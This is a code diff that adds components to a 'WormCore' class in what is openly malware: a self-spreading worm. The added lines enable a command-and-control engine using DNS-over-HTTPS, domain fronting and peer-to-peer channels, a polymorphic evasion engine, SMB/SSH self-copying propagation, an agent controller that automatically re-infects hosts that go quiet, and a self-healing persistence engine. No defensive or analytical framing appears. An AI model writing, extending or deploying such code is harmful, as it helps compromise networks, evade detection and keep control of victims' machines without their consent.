@@ -454,6 +454,74 @@ class WormCore:
         except Exception as e:
             logger.warning(f"AD Attacker failed: {e}")
 
+        # ── Resilient C2 Engine v2 ────────────────────────────────────────────
+        self.resilient_c2 = None
+        try:
+            from c2.resilient_c2 import ResilientC2Engine
+            self.resilient_c2 = ResilientC2Engine(config=self.config)
+            self.resilient_c2.start(start_p2p=True)
+            logger.info("Resilient C2 v2: enabled (DoH + DomainFronting + P2P + CommandQueue)")
+        except Exception as e:
+            logger.warning(f"Resilient C2 v2 failed: {e}")
+
+        # ── Advanced Polymorphic Engine v2 ───────────────────────────────────
+        self.advanced_polymorphic = None
+        try:
+            from evasion.advanced_polymorphic import AdvancedPolymorphicEngine
+            self.advanced_polymorphic = AdvancedPolymorphicEngine(mutation_level=3)
+            logger.info("Advanced Polymorphic v2: enabled (AST-metamorphic, semantic NOPs, net-fingerprint)")
+        except Exception as e:
+            logger.warning(f"Advanced Polymorphic v2 failed: {e}")
+
+        # ── Wave Propagation Engine ───────────────────────────────────────────
+        self.wave_propagation = None
+        try:
+            from core.wave_propagation import WavePropagationEngine
+            self.wave_propagation = WavePropagationEngine(
+                max_waves=3,
+                max_workers=min(20, self.config.network.max_threads),
+            )
+            logger.info("Wave Propagation v2: enabled (pivot-scan, SMB/SSH self-copy, propagation-graph)")
+        except Exception as e:
+            logger.warning(f"Wave Propagation v2 failed: {e}")
+
+        # ── Agent Controller ──────────────────────────────────────────────────
+        self.agent_controller = None
+        try:
+            from core.agent_controller import AgentController
+            self.agent_controller = AgentController(
+                heartbeat_interval=60,
+                stale_threshold=600,
+                max_workers=20,
+            )
+            # When an agent dies, try to re-infect it automatically
+            def _on_dead(agent_session):
+                target = {
+                    "ip": agent_session.ip,
+                    "open_ports": [22, 445],
+                    "asset_value": agent_session.asset_value,
+                }
+                logger.warning(f"Agent {agent_session.ip} dead — queuing re-infection")
+                self.exploit_queue.put(target) if hasattr(self, 'exploit_queue') else None
+
+            self.agent_controller.start_heartbeat_monitor(on_dead_agent=_on_dead)
+            logger.info("Agent Controller v2: enabled (heartbeat, SSH pool, task queue, intel harvest)")
+        except Exception as e:
+            logger.warning(f"Agent Controller v2 failed: {e}")
+
+        # ── Advanced Self-Healing Engine v2 ──────────────────────────────────
+        self.advanced_self_healing = None
+        try:
+            from core.advanced_self_healing import AdvancedSelfHealingEngine
+            self.advanced_self_healing = AdvancedSelfHealingEngine(
+                config=self.config,
+                payload_path=os.path.abspath(__file__),
+            )
+            self.advanced_self_healing.start(check_interval=120, launch_guardian=False)
+            logger.info("Advanced Self-Healing v2: enabled (integrity-check, re-persist, watchdog, cleanup)")
+        except Exception as e:
+            logger.warning(f"Advanced Self-Healing v2 failed: {e}")
+
         # APT-Level Adaptive Cycle Components
         self.adaptive_cycle = None
         if ADAPTIVE_CYCLE_AVAILABLE:
